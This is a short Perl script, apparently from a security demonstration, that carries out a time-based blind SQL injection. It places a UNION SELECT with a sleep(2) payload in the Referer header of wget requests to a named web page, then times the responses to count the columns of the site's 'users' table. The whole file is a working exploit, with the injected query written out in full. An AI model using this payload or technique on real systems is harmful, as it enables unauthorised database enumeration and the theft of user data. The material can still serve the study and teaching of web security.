#!/usr/bin/perl

# This script dumps the user table  col number of the target website's database
# see the demo video of this blind sql injection attack at
# https://www.youtube.com/watch?v=rNzBF1s8byY
#


use Benchmark;
$end=0;
print "The no. of col in users table is: ";

for ($i=1;;$i++)
{
  $t0 = Benchmark->new;
  `wget -qO /dev/null target.hkntec.net/foophones/view.php\?id=1 --referer="' union  select substr((select count(column_name) FROM information_schema.columns where table_name='users'),1,1) = $i and sleep(2); -- a"`;
  $t1 = Benchmark->new;
  $diffs = timediff( $t1, $t0 );
  $res=@$diffs[0];
  if ($res > 1) {print $i;last;}
}
print "\n";



